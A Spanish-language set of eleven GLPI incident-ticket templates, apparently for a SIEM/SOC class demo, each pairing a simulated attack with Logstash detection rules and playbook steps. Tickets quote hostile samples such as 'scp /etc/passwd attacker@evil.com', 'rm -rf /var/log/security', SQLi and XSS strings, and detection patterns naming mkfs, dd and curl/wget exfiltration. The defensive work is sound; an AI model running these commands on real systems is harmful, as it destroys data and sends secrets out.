# Plantillas de Tickets GLPI - 11 Escenarios

Instrucciones: Copiar y pegar en GLPI → Asistencia → Crear ticket

## 1. SSH BRUTE FORCE (MEDIUM)

```
Título: MEDIUM: SSH Brute Force desde 192.168.1.50 - 04/02/2026

Descripción:
ATAQUE SSH BRUTE FORCE
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
IP Origen: 192.168.1.50
Intentos detectados: >10 fallos
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "ssh_brute_force"
- Tags: ssh_brute_force, security_event
- Patrón: Failed password for invalid user

ACCIONES (según PLAYBOOK):
1. Bloquear IP en firewall (iptables)
2. Revisar logs completos /var/log/auth.log
3. Cambiar puerto SSH si persiste

TAXONOMÍA: VERIS - Hacking/Brute force
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## 2. SQL INJECTION (HIGH)

```
Título: HIGH: SQL Injection en aplicación web - 04/02/2026

Descripción:
ATAQUE SQL INJECTION
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client (Apache)
IP Origen: 192.168.1.105
Query maliciosa: SELECT * FROM users WHERE 1=1--
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "sql_injection"
- Tags: sql_injection, security_event
- Patrón: SELECT, UNION, OR 1=1, DROP TABLE

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen inmediatamente
2. WAF: Activar modo blocking para SQLi
3. Revisar logs Apache últimas 24h
4. Verificar integridad base de datos

TAXONOMÍA: VERIS - Hacking/SQLi
SLA: 1h respuesta / 24h resolución
ESCALAR: DBA + CISO
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 3. XSS ATTACK (HIGH)

```
Título: HIGH: XSS Attack detectado en formulario web - 04/02/2026

Descripción:
ATAQUE CROSS-SITE SCRIPTING (XSS)
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client (Apache)
Payload: <script>alert('XSS')</script>
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "xss_attack"
- Tags: xss_attack, security_event
- Patrón: <script>, onerror=, javascript:

ACCIONES (según PLAYBOOK):
1. Sanitizar inputs en aplicación web
2. Implementar Content Security Policy (CSP)
3. WAF: Bloquear payloads XSS conocidos
4. Revisar logs web completos

TAXONOMÍA: VERIS - Hacking/XSS
SLA: 1h respuesta / 24h resolución
ESCALAR: Desarrollo + Seguridad
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 4. COMANDO DESTRUCTIVO (CRITICAL)

```
Título: CRÍTICO: Comando destructivo rm -rf ejecutado - 04/02/2026

Descripción:
INCIDENTE CRÍTICO - COMANDO DESTRUCTIVO
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Usuario: root
Comando ejecutado: rm -rf /var/log/security
IP Origen: [INTERNA]
Severidad: CRITICAL

DETECCIÓN:
- Detectado por regla Logstash "destructive_command"
- Tags: destructive_command, security_event
- Patrón: rm -rf, mkfs, dd if=/dev/zero

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Aislar host de red INMEDIATAMENTE
2. Bloquear usuario root
3. Iniciar análisis forense
4. Revisar backups disponibles
5. Identificar vector de compromiso

TAXONOMÍA: VERIS - Misuse/Privilege Abuse
SLA: 15 min respuesta / 4h resolución
ESCALAR: CISO + Dirección TI (URGENTE)
```

Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major

## 5. ESCALADA DE PRIVILEGIOS (CRITICAL)

```
Título: CRÍTICO: Escalada de privilegios detectada - 04/02/2026

Descripción:
INCIDENTE CRÍTICO - PRIVILEGE ESCALATION
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Usuario origen: user01 → root
Comando: sudo su -
Severidad: CRITICAL

DETECCIÓN:
- Detectado por regla Logstash "privilege_escalation"
- Tags: privilege_escalation, security_event
- Patrón: sudo su, sudo -i, sudo /bin/bash

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Bloquear usuario user01 inmediatamente
2. Auditar comandos sudo ejecutados
3. Revisar /var/log/auth.log completo
4. Cambiar contraseñas root de emergencia
5. Verificar configuración sudoers

TAXONOMÍA: VERIS - Misuse/Privilege Escalation
SLA: 15 min respuesta / 4h resolución
ESCALAR: CISO + Administradores (URGENTE)
```

Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major

## 6. PORT SCANNING (MEDIUM)

```
Título: MEDIUM: Port Scanning desde 192.168.1.75 - 04/02/2026

Descripción:
PORT SCANNING DETECTADO
Timestamp: 04/02/2026 [HORA]
Host objetivo: syslog-client
IP Origen: 192.168.1.75
Puertos escaneados: 1-65535
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "port_scanning"
- Tags: port_scanning, security_event
- Patrón: nmap scan, masscan, SYN flood

ACCIONES (según PLAYBOOK):
1. Bloquear IP origen en firewall
2. Revisar logs de conexiones últimas 6h
3. Verificar puertos expuestos innecesarios
4. Implementar rate limiting

TAXONOMÍA: VERIS - Hacking/Network probing
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## 7. PROCESOS SOSPECHOSOS (HIGH)

```
Título: HIGH: Proceso sospechoso cryptominer detectado - 04/02/2026

Descripción:
PROCESO MALICIOSO DETECTADO
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Proceso: /tmp/.hidden/cryptominer
PID: [AUTO]
CPU Usage: 100%
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "suspicious_process"
- Tags: suspicious_process, security_event
- Patrón: cryptominer, .hidden, /tmp/malware

ACCIONES (según PLAYBOOK):
1. Kill proceso inmediatamente (kill -9)
2. Aislar host de red
3. Buscar persistencia (cron, systemd)
4. Análisis memoria y disco (forensics)
5. Eliminar archivos maliciosos
6. Escaneo antivirus completo

TAXONOMÍA: VERIS - Malware/Cryptominer
SLA: 1h respuesta / 24h resolución
ESCALAR: Seguridad + Forense
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 8. EXFILTRACIÓN DE DATOS (HIGH)

```
Título: HIGH: Exfiltración de datos detectada - 04/02/2026

Descripción:
DATA EXFILTRATION DETECTADA
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Comando: scp /etc/passwd attacker@evil.com
Destino: evil.com (IP externa)
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "data_exfiltration"
- Tags: data_exfiltration, security_event
- Patrón: scp, curl, wget con destinos externos

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Bloquear conexión destino en firewall
2. Identificar datos exfiltrados
3. Revisar logs de transferencias últimas 48h
4. Aislar host afectado
5. Notificar DPO (protección de datos)
6. Análisis forense completo

TAXONOMÍA: VERIS - Hacking/Data theft
SLA: 1h respuesta / 24h resolución
ESCALAR: CISO + DPO + Legal (URGENTE)
REGULATORIO: Posible GDPR breach
```

Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=5-Very High

## 9. DDoS SIMULATION (MEDIUM)

```
Título: MEDIUM: Posible DDoS desde múltiples IPs - 04/02/2026

Descripción:
ATAQUE DDoS DETECTADO
Timestamp: 04/02/2026 [HORA]
Host objetivo: syslog-client
Tipo: SYN flood
Tráfico: 10000+ paquetes/seg
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "ddos_attack"
- Tags: ddos_attack, security_event
- Patrón: SYN flood, UDP flood, HTTP flood

ACCIONES (según PLAYBOOK):
1. Activar mitigación DDoS (Cloudflare/WAF)
2. Rate limiting agresivo
3. Bloquear rangos IP atacantes
4. Contactar ISP si persiste
5. Monitorizar ancho de banda

TAXONOMÍA: VERIS - Hacking/DoS
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## 10. MALWARE DETECTION (HIGH)

```
Título: HIGH: Malware backdoor.sh detectado - 04/02/2026

Descripción:
MALWARE DETECTADO EN SISTEMA
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Archivo: /tmp/backdoor.sh
Hash: [calcular con md5sum]
Severidad: HIGH

DETECCIÓN:
- Detectado por regla Logstash "malware_detection"
- Tags: malware_detection, security_event
- Patrón: backdoor, trojan, rootkit

ACCIONES INMEDIATAS (según PLAYBOOK):
1. Aislar host de red
2. Copiar malware para análisis (sandbox)
3. Eliminar archivo malicioso
4. Buscar IOCs relacionados
5. Escaneo completo sistema
6. Revisar logs de ejecución
7. Reimagen sistema si necesario

TAXONOMÍA: VERIS - Malware/Backdoor
SLA: 1h respuesta / 24h resolución
ESCALAR: Seguridad + Forense + CISO
```

Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High

## 11. UNAUTHORIZED ACCESS (MEDIUM)

```
Título: MEDIUM: Acceso no autorizado a directorio /etc - 04/02/2026

Descripción:
ACCESO NO AUTORIZADO DETECTADO
Timestamp: 04/02/2026 [HORA]
Host afectado: syslog-client
Usuario: nobody (UID 99)
Recurso: /etc/shadow (lectura)
Severidad: MEDIUM

DETECCIÓN:
- Detectado por regla Logstash "unauthorized_access"
- Tags: unauthorized_access, security_event
- Patrón: Acceso a archivos sensibles por usuario no privilegiado

ACCIONES (según PLAYBOOK):
1. Revisar permisos /etc/shadow (debería ser 000)
2. Auditar logs de accesos últimas 24h
3. Identificar proceso que intentó acceso
4. Verificar escalada de privilegios
5. Revisar configuración AppArmor/SELinux

TAXONOMÍA: VERIS - Misuse/Unauthorized access
SLA: 4h respuesta / 3 días resolución
```

Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium

## RESUMEN POR SEVERIDAD

CRITICAL (2 tickets):
- 4. Comando Destructivo
- 5. Escalada de Privilegios

HIGH (5 tickets):
- 2. SQL Injection
- 3. XSS Attack
- 7. Procesos Sospechosos
- 8. Exfiltración de Datos
- 10. Malware Detection

MEDIUM (4 tickets):
- 1. SSH Brute Force
- 6. Port Scanning
- 9. DDoS Simulation
- 11. Unauthorized Access

## PARA LA DEMO

Recomendación: Crea solo 1-2 tickets durante la presentación (máximo 5 minutos). Los más impactantes:

1. Comando Destructivo (CRITICAL) - Ticket #4 (MEJOR OPCIÓN)
2. SQL Injection (HIGH) - Ticket #2

Los otros 9: Menciona que ya están documentados pero por tiempo solo mostrarás el crítico.

Frase para la demo: 
"El sistema ha detectado 11 tipos de ataques diferentes. Por tiempo, voy a documentar el más crítico: comando destructivo. Los otros 10 ya están documentados siguiendo el mismo proceso."

## TIPS

- Copiar rápido: Ctrl + C todo el bloque
- Pegar en GLPI: Campo Descripción soporta múltiples líneas
- Timestamp: Reemplaza [HORA] con hora actual
- IP/PID: Puedes dejar genéricos o copiar de Kibana
- Durante demo: Solo crear 1 ticket (el CRITICAL), mencionar que proceso se repite para los otros 10
